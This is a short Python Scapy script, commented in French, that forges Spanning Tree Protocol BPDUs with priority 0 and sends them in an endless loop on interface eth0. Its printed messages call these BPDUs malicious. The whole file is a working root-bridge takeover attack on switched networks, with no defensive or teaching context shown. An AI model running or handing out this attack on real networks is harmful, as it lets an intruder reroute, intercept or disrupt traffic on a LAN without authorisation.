from scapy.all import *

# BPDU avec priorité 0 pour devenir root bridge
bpdu = (
    Ether(dst="01:80:c2:00:00:00", src="08:00:27:59:87:3e") /
    LLC(dsap=0x42, ssap=0x42, ctrl=0x03) /
    STP(
        proto=0, version=0,
        bpdutype=0, bpduflags=0,
        rootid=0, rootmac="08:00:27:59:87:3e",
        pathcost=0,
        bridgeid=0, bridgemac="08:00:27:59:87:3e",
        portid=0x8001,
        age=0, maxage=20, hellotime=2, fwddelay=15
    )
)

print("[*] Envoi de BPDU malveillants pour devenir root bridge...")
while True:
    sendp(bpdu, iface="eth0", verbose=False)
    print("[+] BPDU envoyé")
    time.sleep(2)